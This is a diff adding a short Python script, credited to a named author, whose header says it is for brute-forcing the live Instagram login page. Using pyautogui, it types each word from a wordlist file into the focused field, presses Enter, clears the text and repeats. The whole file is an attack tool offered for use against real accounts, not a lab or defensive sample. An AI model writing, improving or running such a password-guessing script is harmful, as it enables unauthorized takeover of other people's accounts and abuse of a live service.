@@ -1,0 +1,27 @@
+#This code is create by Syed Md Abu Haider for brute force live insta log in page.
+#Use credit to use this tool
+import pyautogui
+import time
+
+# Path to your text file containing words (one word per line)
+text_file_path = 'path_to_your_text_file.txt'
+
+# Read words from the text file
+with open(text_file_path, 'r') as file:
+    words = file.read().splitlines()
+
+# Give some time to switch to the target application
+time.sleep(5)
+
+# Type each word, wait for 1 second, hit Enter, and clear the text box
+for word in words:
+    pyautogui.typewrite(word)
+    time.sleep(1)       # Wait for 1 second
+    pyautogui.press('enter')
+    time.sleep(0.5)     # Adjust the delay as needed
+
+    # Select and delete the typed text
+    pyautogui.hotkey('ctrl', 'a')  # Select all text
+    pyautogui.press('delete')      # Delete selected text
+
+print("All words have been typed, submitted, and text cleared.")
